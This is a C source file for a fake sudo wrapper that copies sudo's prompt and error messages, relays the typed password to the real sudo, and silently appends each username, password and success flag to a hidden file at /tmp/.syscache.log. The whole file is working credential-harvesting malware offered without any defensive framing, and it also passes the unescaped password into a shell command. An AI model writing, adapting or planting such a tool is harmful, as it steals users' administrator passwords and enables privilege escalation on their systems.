#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <pwd.h>
#include <termios.h>
#include <stdio.h>

#define BUFFER_SIZE  100
#define MAX_PW_ATTEMPTS  3
#define DEFAULT_LOCATION "/tmp/.syscache.log"

int save_password(char *username, char *password, char *status)
{
    char text[BUFFER_SIZE] = {0};
    snprintf(text, sizeof(text), "%s:%s:%s\n", username, password, status);

    FILE *fp;
    fp = fopen(DEFAULT_LOCATION, "a+");
    if (fp != NULL)
    {
        fwrite(text, 1, sizeof(text), fp);
    }
    fclose(fp);
    return 0;
}

int basic_sudo(char *arguments) {

    char orgiginal_cmd[BUFFER_SIZE] = {0};

    snprintf(orgiginal_cmd, sizeof(orgiginal_cmd), "/usr/bin/sudo%s", arguments);
    system(orgiginal_cmd);
    return 0;
}

int check_sudo() {
    int ret;
    ret = system("/usr/bin/sudo -n true 2>/dev/null");
    if (ret == 256) {
        return 0;
    } else {
        return 1;
    }
}

ssize_t get_user_pass(char **lineptr, size_t *n, FILE *stream)
{
    struct termios old, new;
    int nread;

    if (tcgetattr (fileno (stream), &old) != 0)
        return -1;
    new = old;
    new.c_lflag &= ~ECHO;
    if (tcsetattr (fileno (stream), TCSAFLUSH, &new) != 0)
        return -1;

    nread = getline (lineptr, n, stream);

    (void) tcsetattr (fileno (stream), TCSAFLUSH, &old);

    return nread;
}

int main(int argc, char const *argv[])
{
    struct passwd *usr = getpwuid(getuid());
    char *password = NULL;
    char arguments[BUFFER_SIZE] = {0};
    char command[BUFFER_SIZE] = {0};

    size_t len = 0;
    int args;
    int pw_attempts = 1;

    for (args = 1; args < argc; ++args) {
        snprintf(arguments+strlen(arguments), sizeof(arguments)-strlen(arguments), " %s", argv[args]);
    }

    if(usr) {
        if (!check_sudo()) {
            if (argc != 1) {
                while(pw_attempts <= MAX_PW_ATTEMPTS) {
                    printf("[sudo] password for %s: ", usr->pw_name);
                    get_user_pass(&password, &len, stdin);

                    if(password[strlen(password)-1] == '\n') password[strlen(password)-1] = '\0';                 
           
                    snprintf(command, sizeof(command), "echo %s | /usr/bin/sudo -S%s 2>/dev/null", password, arguments);
                    printf("\n");
                    if((system(command)) == 256) {
                        printf("Sorry, try again.\n");
                        save_password(usr->pw_name, password, "ERROR");
                    } else {
                        save_password(usr->pw_name, password, "SUCCESS");
                        break;
                    }

                    if (pw_attempts == MAX_PW_ATTEMPTS) {
                        printf("sudo: %d incorrect password attempts\n", MAX_PW_ATTEMPTS);
                    }

                    pw_attempts++;
                }

                free(password);
            } else {
                basic_sudo("");
            }
        } else {
            basic_sudo(arguments);
        }
    } else {
        basic_sudo(arguments);
    }
    return 0;
}